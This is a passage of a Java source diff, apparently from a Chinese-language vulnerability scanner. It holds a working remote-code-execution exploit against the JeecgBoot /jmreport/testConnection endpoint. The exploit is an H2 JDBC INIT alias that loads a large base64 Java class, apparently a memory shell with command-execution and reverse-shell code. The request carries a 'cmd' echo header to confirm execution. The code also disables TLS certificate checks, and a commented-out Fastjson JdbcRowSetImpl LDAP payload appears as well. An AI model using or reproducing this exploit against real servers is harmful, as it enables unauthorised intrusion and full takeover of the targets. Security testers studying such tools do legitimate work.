FzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEABXN0YXJ0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTG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')\",\n" +
+                        "          \"dbName\":\"383BAb7deFC825E6\",\n" +
+                        "          \"dbPassword\":\"917982\",\n" +
+                        "          \"userName\":\"917982\"\n" +
+                        "        }";
+                //   String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
+                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+                connection.setDoOutput(true);
+                connection.setRequestMethod("POST");
+                // String a;
+                //      ml.setText(randomNumber + "." + ml.getText());
+                //  String a;
+                //   a = ml.getText();
+
+                connection.setRequestProperty("Content-Type", "application/json");
+                connection.setRequestProperty("cmd", "echo 7868765756767");
+                byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                OutputStream os = connection.getOutputStream();
+                os.write(input, 0, input.length);
+                os.flush();
+                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                //  byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                //  OutputStream os = connection.getOutputStream();
+                //   os.write(input, 0, input.length);
+                //   os.flush();
+                //   BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                StringBuffer response = new StringBuffer();
+                String inputLine;
+                response.append(inputLine = br.readLine());
+                while ((inputLine = br.readLine()) != null) {
+                    response.append(inputLine);
+                }
+
+
+                if (response.toString().contains("7868765756767")) {
+
+
+                    test2.appendText(formattedDateTime + url + "[+++]可能存在jeect-boot testConnection远程命令执行漏洞" + "\n");
+                    //   test2.appendText(response.toString());
+
+
+                } else {
+
+                    test2.appendText(formattedDateTime + url + "[-]不存在jeect-boot testConnection远程命令执行漏洞" + "\n");
+                }
+
+
+            } catch (Exception e) {
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                test2.appendText(formattedDateTime + url + "[-]不存在jeect-boot testConnection远程命令执行漏洞-" + "\n");
+                //     System.out.println(e);
+
+            }
+
+        }
+
+
+    }
+
+    public void jeecgpl(String line) {
+
+        try {
+
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            Random random = new Random();
+            int randomNumber = random.nextInt(100);
+
+            URL url1 = new URL(line + "/jmreport/testConnection");
+            String json = "{\n" +
+                    "          \"id\":\"1\",\n" +
+                    "          \"code\":\"ABC\",\n" +
+                    "          \"dbType\":\"MySQL\",\n" +
+                    "          \"dbDriver\":\"org.h2.Driver\",\n" +
+                    "          \"dbUrl\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\\\;}catch (Exception e){e.printStackTrace()\\\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\\\\\"defineClass\\\\\\\", byte[].class,int.class,int.class)\\\\;defineClassMethod.setAccessible(true)\\\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\\\;clz.newInstance()\\\\;}'\\\\;CALL EXEC('yv66vgAAADEBawoAHQCSCgBEAJMKAEQAlAoAHQCVCACWCgAbAJcKAJgAmQoAmACaBwCbCgBEAJwIAIwKACAAnQgAnggAnwcAoAgAoQgAogcAowoAGwCkCAClCACmBwCnCwAWAKgLABYAqQgAqggAqwcArAoAGwCtBwCuCgCvALAIALEHALIIALMKAH4AtAoAIAC1CAC2CQAmALcHALgKACYAuQgAugoAfgC7CgAbALwIAL0HAL4KABsAvwgAwAcAwQgAwggAwwoAGwDEBwDFCgBEAMYKAMcAuwgAyAoAIADJCADKCgAgAMsIAMwKACAAzQoAIADOCADPCgAgANAIANEJAH4A0goAJgDTCgAmANQJAH4A1QcA1goARADXCgBEANgIAI0IANkKAH4A2ggA2woA3ADdCgAgAN4IAN8IAOAIAOEHAOIKAFAAkgoAUADjCADkCgBQAOUIAOYIAOcIAOgIAOkKAOoA6woA6gDsBwDtCgDuAO8KAFsA8AgA8QoAWwDyCgBbAPMKAFsA9AoA7gD1CgDuAPYKAC8A5QgA9woAIAD4CAD5CgDqAPoHAPsKACYA/AoAaQD9CgBpAO8KAO4A/goAaQD+CgBpAP8KAQABAQoBAAECCgEDAQQKAQMBBQUAAAAAAAAAMgoARAEGCgDuAQcKAGkBCAgBCQoALwEKCAELCAEMCgB+AQ0HAQ4BAAJpcAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAHZXhlY3V0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAB3JldmVyc2UBADkoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyOylMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAApTb3VyY2VGaWxlAQAHQTQuamF2YQwAgwCEDAEPARAMAREBEgwBEwEUAQAHdGhyZWFkcwwBFQEWBwEXDAEYARkMARoBGwEAE1tMamF2YS9sYW5nL1RocmVhZDsMARwBHQwBHgEfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MASABFAEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwBIQEiDAEaASMBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBJAElAQAQamF2YS9sYW5nL09iamVjdAcBJgwBJwEoAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAigCLDAEpASoBAAlzZXRTdGF0dXMMASsBLAEAEWphdmEvbGFuZy9JbnRlZ2VyDACDAS0BACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMAIgAiQwBLgEvAQAIc2V0Qnl0ZXMBAAJbQgwBMAElAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBMQCJAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MATIBMwcBNAEAAAwBNQE2AQAQY29tbWFuZCBub3QgbnVsbAwBNwEdAQAFIyMjIyMMATgBOQwBOgE7AQABOgwBPAE9AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAfwCADAE+AT8MAUABQQwAgQCCAQAQamF2YS9sYW5nL1RocmVhZAwAgwFCDAFDAIQBAAVAQEBAQAwAjACLAQAHb3MubmFtZQcBRAwBRQCLDAFGAR0BAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBRwFIAQAFIC1uIDQMAUkBHQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwFKDAFLAUwMAIwBTQEAEWphdmEvdXRpbC9TY2FubmVyBwFODAFPAVAMAIMBUQEAAlxhDAFSAVMMAVQBVQwBVgEdDAFXAVAMAVgAhAEABy9iaW4vc2gMAIMBWQEAB2NtZC5leGUMAIwBWgEAD2phdmEvbmV0L1NvY2tldAwBWwEiDACDAVwMAV0BXgwBXwFVBwFgDAFhASIMAWIBIgcBYwwBZAEtDAFlAIQMAWYBZwwBaAEiDAFpAIQBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBagEdAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAI0AjgEAAkE0AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEABXN0YXJ0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEADmdldEVycm9yU3RyZWFtAQAHZGVzdHJveQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGludFZhbHVlAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQATamF2YS9pby9J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')\",\n" +
+                    "          \"dbName\":\"383BAb7deFC825E6\",\n" +
+                    "          \"dbPassword\":\"917982\",\n" +
+                    "          \"userName\":\"917982\"\n" +
+                    "        }";
+            //   String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            connection.setDoOutput(true);
+            connection.setRequestMethod("POST");
+            // String a;
+            //      ml.setText(randomNumber + "." + ml.getText());
+            //  String a;
+            //   a = ml.getText();
+
+            connection.setRequestProperty("Content-Type", "application/json");
+            connection.setRequestProperty("cmd", "echo 87685675765");
+            byte[] input = json.getBytes(StandardCharsets.UTF_8);
+            OutputStream os = connection.getOutputStream();
+            os.write(input, 0, input.length);
+            os.flush();
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            //  byte[] input = json.getBytes(StandardCharsets.UTF_8);
+            //  OutputStream os = connection.getOutputStream();
+            //   os.write(input, 0, input.length);
+            //   os.flush();
